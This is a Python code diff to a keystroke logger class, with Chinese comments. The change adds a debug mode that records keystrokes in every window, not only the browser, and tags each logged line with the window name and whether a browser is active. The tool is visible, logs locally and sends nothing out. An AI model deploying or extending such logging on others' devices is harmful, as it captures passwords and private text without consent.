@@ -15,9 +15,10 @@ from .detectors import get_active_window_name, is_browser_active
 class KeyLogger:
     """键盘记录器"""
 
-    def __init__(self, log_file: Path):
+    def __init__(self, log_file: Path, debug_mode: bool = False):
         self.log_file = log_file
         self.listener = None
+        self.debug_mode = debug_mode
 
     def format_key(self, key) -> str:
         """格式化按键为可读字符串"""
@@ -59,14 +60,24 @@ class KeyLogger:
 
     def on_press(self, key):
         """键盘按下事件"""
-        if not is_browser_active():
+        window_name = get_active_window_name() or "Unknown"
+        is_browser = is_browser_active()
+
+        # 调试模式：记录所有按键
+        # 正常模式：只记录浏览器按键
+        if not self.debug_mode and not is_browser:
             return
 
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        window_name = get_active_window_name() or "Unknown"
         key_str = self.format_key(key)
 
-        log_line = f"[{timestamp}] [{window_name}] {key_str}\n"
+        # 添加浏览器状态标记
+        browser_status = "[浏览器]" if is_browser else "[非浏览器]"
+        log_line = f"[{timestamp}] {browser_status} [{window_name}] {key_str}\n"
+
+        # 实时显示按键信息（调试模式）
+        if self.debug_mode:
+            print(f"\r{browser_status} [{window_name}] {key_str}", end="", flush=True)
 
         # 写入日志文件
         try:
@@ -89,10 +100,16 @@ class KeyLogger:
 
         print(f"浏览器键盘记录器已启动")
         print(f"日志文件: {self.log_file}")
-        print(f"平台: {self.platform_info()}\n")
+        print(f"平台: {self.platform_info()}")
+        print(f"模式: {'调试模式 (记录所有按键)' if self.debug_mode else '正常模式 (仅记录浏览器)'}\n")
 
-        print("正在监控浏览器键盘输入...")
+        print("正在监控键盘输入...")
         print("按 F12 停止记录\n")
+
+        if self.debug_mode:
+            print("实时窗口信息显示已启用...")
+            print(f"当前窗口: {get_active_window_name()}")
+            print(f"是否为浏览器: {is_browser_active()}\n")
 
         self.listener = keyboard.Listener(
             on_press=self.on_press,
